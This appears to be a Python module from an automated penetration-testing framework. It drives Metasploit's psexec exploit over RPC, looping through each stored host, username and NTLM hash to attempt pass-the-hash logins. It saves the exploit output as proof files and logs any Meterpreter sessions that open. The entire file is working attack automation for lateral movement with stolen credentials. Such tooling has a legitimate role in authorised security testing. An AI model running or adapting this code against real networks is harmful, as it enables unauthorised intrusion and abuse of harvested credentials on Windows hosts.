import re

from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.mymsf import myMsf
from core.utils import Utils


class msf_psexec_pth(actionModule):
    def __init__(self, config, display, lock):
        super(msf_psexec_pth, self).__init__(config, display, lock)
        self.title = "Attempt to authenticate via PSEXEC PTH"
        self.shortName = "MSFpsexec"
        self.description = "execute [use exploit/windows/smb/psexec] on each target"

        self.requirements = ["msfconsole"]
        self.triggers = ["newNTLMHash"]
        self.types = ["passwords"]

        self.safeLevel = 4

    def getTargets(self):
        # we are interested only in the hosts that had nullsessions
        self.targets = kb.get('host')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        if len(self.targets) > 0:
            # connect to msfrpc
            msf = myMsf(host=self.config['msfhost'], port=self.config['msfport'], user=self.config['msfuser'],
                        password=self.config['msfpass'])

            if not msf.isAuthenticated():
                return

            # loop over each target
            for t in self.targets:
                users = kb.get("host/" + t + "/user")
                for user in users:
                    hashes = kb.get ("host/" + t + "/user/" + user + "/fullhash")
                    for passhash in hashes:
                        # verify we have not tested this host before
                        if not self.seentarget(t+user+passhash):
                            # add the new IP to the already seen list
                            self.addseentarget(t+user+passhash)
                            self.display.verbose(self.shortName + " - Connecting to " + t)
                            msf.execute("use exploit/windows/smb/psexec\n")
                            # msf.execute("set PAYLOAD windows/meterpreter/bind_tcp\n")
                            # msf.execute("set LHOST %s\n" % self.config['lhost'])
                            # msf.execute("set LPORT %i\n" % int(Utils.getUnusedPort()))
                            # msf.execute("set LPORT 4444\n")
                            msf.execute("set RPORT 445\n")
                            msf.execute("set RHOST " + t + "\n")
                            msf.execute("set SMBUser " + user + "\n")
                            msf.execute("set SMBPass " + passhash + "\n")
                            msf.execute("exploit -j\n")
                            msf.sleep(int(self.config['msfexploitdelay']))
        
                            outfile = self.config["proofsDir"] + self.shortName + "_" + t + "_" + Utils.getRandStr(10)
                            result = msf.getResult()
                            Utils.writeFile(result, outfile)
                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))
        
                            parts = re.findall(".*Meterpreter session (\d+) opened.*", result)
                            for part in parts:
                                self.fire("msfSession")
                                self.display.verbose("NEW session on : " + t)
                                kb.add("host/" + t + "/msfSession/" + str(part))
        
            # clean up after ourselves
            result = msf.cleanup()

        return
